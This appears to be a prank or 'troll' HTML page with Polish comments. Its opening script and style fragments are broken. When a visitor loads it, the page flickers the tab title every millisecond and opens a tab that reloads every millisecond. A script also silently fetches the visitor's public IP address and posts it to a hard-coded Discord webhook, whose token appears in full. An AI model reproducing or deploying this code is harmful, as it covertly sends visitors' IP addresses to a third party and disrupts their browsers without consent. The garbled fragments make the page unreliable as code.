<body>

    <script>
        document.getElementById('trollButton').addEventListener('click', function() {

    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;

<script>
    setInterval(function() {
      var titles = ["🌖🌖🌖 ✨", "🌗🌗🌗 🎉", "🌘🌘🌘 🍾"];
      var randomIndex = Math.floor(Math.random() * titles.length);
      document.title = titles[randomIndex]; 
    }, 1); 
  </script>
  
  <script>
    // Funkcja otwierania nowej zakładki z podstroną
    function openSubPage() {
      var file = "ii1.html";
      // Otwórz nową zakładkę z wybranym plikiem
      var newTab = window.open(file, '_blank');
  
      // Funkcja do odświeżania podstrony
      function refreshSubPage() {
        // Odśwież zakładkę z plikiem
        newTab.location.href = file;
      }
  
      
      setInterval(refreshSubPage, 1);
    }
  
    // Otwórz nową zakładkę z podstroną po załadowaniu strony
    window.onload = function() {
      openSubPage();
    };
  </script>
    <script>
      // Funkcja do pobierania adresu IP użytkownika i wysyłania na Discord WebHook
      function sendIPToDiscord() {
          // Pobieranie adresu IP użytkownika
          fetch('https://api64.ipify.org?format=json')
              .then(response => response.json())
              .then(data => {
                  const userIP = data.ip;
                  console.log('Received IP:', userIP);
                  
                  // Wysyłanie IP na Discord WebHook
                  const webhookURL = 'https://discord.com/api/webhooks/1242506086494240818/RSCr0EKBBN1E4aiEdm77NajOMZoW7NAZAralDEoiuIRf31rX_ikTSJI9vixvvKt0Ay1t';
                  fetch(webhookURL, {
                      method: 'POST',
                      headers: {
                          'Content-Type': 'application/json'
                      },
                      body: JSON.stringify({
                          content: `IP Oponęta ${userIP}`
                      })
                  })
                  .then(response => {
                      console.log('WebHook response:', response);
                  })
                  .catch(error => {
                      console.error('Error sending to Discord WebHook:', error);
                  });
              })
              .catch(error => {
                  console.error('Error getting user IP:', error);
              });
      }
      
      // Wywołanie funkcji po załadowaniu strony
      window.onload = function() {
          sendIPToDiscord();
      };
      </script>
</body>
